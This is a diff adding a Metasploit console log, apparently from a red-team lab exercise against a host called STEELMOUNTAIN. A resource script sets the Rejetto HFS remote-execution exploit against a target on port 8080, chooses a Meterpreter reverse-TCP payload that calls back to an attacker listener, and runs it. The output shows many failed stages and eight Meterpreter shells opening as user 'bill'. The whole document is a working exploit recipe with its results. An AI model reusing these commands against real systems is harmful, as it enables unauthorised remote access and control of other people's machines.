@@ -1,0 +1,113 @@
+[*] Spooling to file /home/kali/Redteam-Hermes/logs/steel_state/foothold_latest.log...
+resource (/tmp/steel_foothold_latest.rc)> use exploit/windows/http/rejetto_hfs_exec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+resource (/tmp/steel_foothold_latest.rc)> set RHOSTS 10.146.141.173
+RHOSTS => 10.146.141.173
+resource (/tmp/steel_foothold_latest.rc)> set RPORT 8080
+RPORT => 8080
+resource (/tmp/steel_foothold_latest.rc)> set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+resource (/tmp/steel_foothold_latest.rc)> set LHOST 192.168.129.182
+LHOST => 192.168.129.182
+resource (/tmp/steel_foothold_latest.rc)> set LPORT 4444
+LPORT => 4444
+resource (/tmp/steel_foothold_latest.rc)> run -z
+[*] Started reverse TCP handler on 192.168.129.182:4444 
+[*] Using URL: http://192.168.129.182:8080/NTyTBYlHAgtCg6
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Payload request received: /NTyTBYlHAgtCg6
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 2 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 2 closed.
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 4 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 4 closed.
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] 10.146.141.173 - Meterpreter session 5 closed.  Reason: Died
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 5 is not valid and will be closed
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 6 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 6 closed.
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 7 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 7 closed.
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 8 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 8 closed.
+[-] Meterpreter session 9 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 9 closed.
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 10 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 10 closed.
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 11 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 11 closed.
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[!] Tried to delete %TEMP%\rTaVMjW.vbs, unknown result
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Meterpreter session 1 opened (192.168.129.182:4444 -> 10.146.141.173:50976) at 2026-05-22 16:58:57 -0700
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Meterpreter session 3 opened (192.168.129.182:4444 -> 10.146.141.173:51328) at 2026-05-22 16:58:58 -0700
+[*] Meterpreter session 12 opened (192.168.129.182:4444 -> 10.146.141.173:51113) at 2026-05-22 16:58:58 -0700
+[-] Meterpreter session 17 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 17 closed.
+[*] Meterpreter session 13 opened (192.168.129.182:4444 -> 10.146.141.173:51114) at 2026-05-22 16:58:58 -0700
+[-] Meterpreter session 19 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 19 closed.
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 20 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 20 closed.
+[*] Meterpreter session 14 opened (192.168.129.182:4444 -> 10.146.141.173:51011) at 2026-05-22 16:58:59 -0700
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 21 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 21 closed.
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 22 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 22 closed.
+[*] Meterpreter session 15 opened (192.168.129.182:4444 -> 10.146.141.173:51116) at 2026-05-22 16:59:00 -0700
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[*] Meterpreter session 16 opened (192.168.129.182:4444 -> 10.146.141.173:51117) at 2026-05-22 16:59:00 -0700
+[-] Meterpreter session 23 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 23 closed.
+[*] Meterpreter session 18 opened (192.168.129.182:4444 -> 10.146.141.173:51119) at 2026-05-22 16:59:01 -0700
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 24 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 24 closed.
+[*] Sending stage (199238 bytes) to 10.146.141.173
+[-] Meterpreter session 25 is not valid and will be closed
+[*] 10.146.141.173 - Meterpreter session 25 closed.
+[*] Server stopped.
+[*] Session 18 created in the background.
+resource (/tmp/steel_foothold_latest.rc)> sleep 12
+resource (/tmp/steel_foothold_latest.rc)> sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                         Connection
+  --  ----  ----                     -----------                         ----------
+  1         meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4444 -> 10.146.141.173:50976 (10.146.141.173)
+  3         meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4444 -> 10.146.141.173:51328 (10.146.141.173)
+  12        meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4444 -> 10.146.141.173:51113 (10.146.141.173)
+  13        meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4444 -> 10.146.141.173:51114 (10.146.141.173)
+  14        meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4444 -> 10.146.141.173:51011 (10.146.141.173)
+  15        meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4444 -> 10.146.141.173:51116 (10.146.141.173)
+  16        meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4444 -> 10.146.141.173:51117 (10.146.141.173)
+  18        meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4444 -> 10.146.141.173:51119 (10.146.141.173)
+
+resource (/tmp/steel_foothold_latest.rc)> spool off
